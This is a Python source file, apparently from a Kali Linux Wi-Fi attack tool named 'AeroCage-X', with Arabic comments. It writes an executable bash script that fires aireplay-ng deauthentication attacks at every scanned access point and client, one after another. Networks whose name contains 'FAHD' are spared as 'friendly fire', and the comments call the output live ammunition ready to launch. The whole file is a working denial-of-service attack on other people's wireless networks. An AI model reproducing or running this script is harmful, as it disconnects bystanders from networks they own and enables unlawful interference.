#!/usr/bin/env python3
import os

class StrikeShGenerator:
    @staticmethod
    def compile_salvo_sh(stations, pkts_count, target_socket):
        """[ملف 2]: حظر النيران الصديقة آلياً وكتابة أوامر الحقن التتابعي الموقوت داخل .sh لطلبك"""
        sh_path = "/home/kali/AeroCage-X/storage/active_strikes.sh"
        count_flag = f"-0 {pkts_count}" if pkts_count > 0 else "-0 0"
        
        clean_pool, protected_logs = [], []
        with open(sh_path, "w") as f:
            f.write("#!/bin/bash\n# الذخيرة الحية التتابعية الجاهزة للقذف فوراً لطلبك\n\n")
            
            for tgt in stations:
                # [حظر النيران الصديقة قاطعاً]: منع ضرب أي شبكة تحتوي على بصمة Fahd_Net
                if "FAHD" in tgt["ssid"].upper():
                    if not any(p["mac"] == tgt["client"] for p in protected_logs):
                        protected_logs.append({"mac": tgt["client"], "ssid": tgt["ssid"], "reason": "حماية حياض شبكتك التابعة 🛡️"})
                    continue
                
                cmd = f"aireplay-ng {count_flag} -a {tgt['bssid']} -c {tgt['client']} {target_socket}"
                f.write(f"{cmd}\n")
                f.write("sleep 1\n")
                
                clean_pool.append({"client": tgt["client"], "bssid": tgt["bssid"], "ssid": tgt["ssid"], "cmd": cmd})
                
        os.chmod(sh_path, 0o755)
        return clean_pool, protected_logs
